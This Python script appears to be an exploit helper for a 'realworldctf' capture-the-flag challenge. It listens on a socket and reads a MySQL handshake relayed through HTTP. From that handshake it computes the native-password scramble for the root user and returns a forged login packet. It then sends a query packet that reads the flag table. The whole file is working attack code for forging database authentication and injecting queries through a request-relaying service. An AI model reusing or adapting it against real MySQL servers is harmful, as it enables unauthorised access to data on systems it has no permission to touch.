#!-*- coding:utf-8 -*-
import socket
import re
import struct
import hashlib
import base64

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 58889
server_socket.bind(("0.0.0.0", port))
server_socket.listen(5)
step = 0
initial_packet = ""
password = "realworldctf"
sql_query = b"select flag from web.flag"
def encryption_pass(password, seed):
    pass1 = hashlib.sha1(password.encode()).digest()
    pass2 = hashlib.sha1(pass1).digest()
    pass3 = hashlib.sha1(bytes.fromhex(seed) + pass2).digest()
    result = ""
    for i in range(len(pass3)):
        result += format(pass3[i] ^ pass1[i], '02x')
    return result

while True:
    if step == 0:
        client_socket, addr = server_socket.accept()
        print("Got a connection from %s" % str(addr))
        data = client_socket.recv(1024).decode("latin-1")
        content = re.search(r"Content-Length: [0-9]*\r\n\r\n(.*)",data, re.S).group(1)
        print("Content:" + content)
        content = content.replace("\xff", "\xff\xff")
        if "mysql_native_password\x00" not in content:
            initial_packet += content + "\xff"
        else:
            initial_packet += content
            strip_packet_length = initial_packet[4:]
            idx = strip_packet_length.find("\x00") + 5
            strip_pvt = strip_packet_length[idx:]
            print("strip_pvt: ", strip_pvt.encode("latin-1").hex())
            salt1 = strip_pvt[0:strip_pvt.find("\x00")]
            idx = -24
            while 1:
                if strip_pvt[idx] == "\x00":
                    break
                idx -= 1
            salt2 = strip_pvt[idx+1:-23]
            print("Initial packet:" + initial_packet)
            seed = salt1.encode("latin-1").hex() + salt2.encode("latin-1").hex()
            print("seed: ",seed)
            encrypted_pass = encryption_pass(password, seed)
            print("Encryption password:" + encrypted_pass)
            # username root : 726f6f74
            response_packet = "8da21a00000000c0e00000000000000000000000000000000000000000000000\
                        726f6f7400\
                        {password_length}\
                        {password_content}\
                        776562006d7973716c5f6e61746976655f70617373776f726400250c5f636c69656e745f6e616d65076d7973716c6e640c5f7365727665725f686f7374026462"
            password_length = len(encrypted_pass) // 2
            password_length = format(password_length, '02x')
            response_packet = response_packet.format(password_length=password_length, password_content=encrypted_pass)
            response_packet = bytes.fromhex(response_packet)
            packet_length = len(response_packet)
            #packet_length = "7a0000" -> 122
            packet_length = struct.pack("<i", packet_length)[:3] + b"\x01"
            response_packet = packet_length + response_packet
            # http response
            response_body = base64.b64encode(response_packet)
            response = b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(response_body) + response_body + b"\r\n"
            print("Response:" + response.decode("latin-1"))
            assert b"\xff" not in response
            client_socket.send(response)
            step = 1
        client_socket.close()
    elif step == 1:
        client_socket, addr = server_socket.accept()
        print("Got a connection from %s" % str(addr))
        pack_len = len(sql_query) + 1
        pack_sql = struct.pack("<i", pack_len)+ b"\x03" + sql_query
        response_body = base64.b64encode(pack_sql)
        response = b"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n" % len(response_body) + response_body + b"\r\n"
        client_socket.send(response)
        break
server_socket.close()
    
        

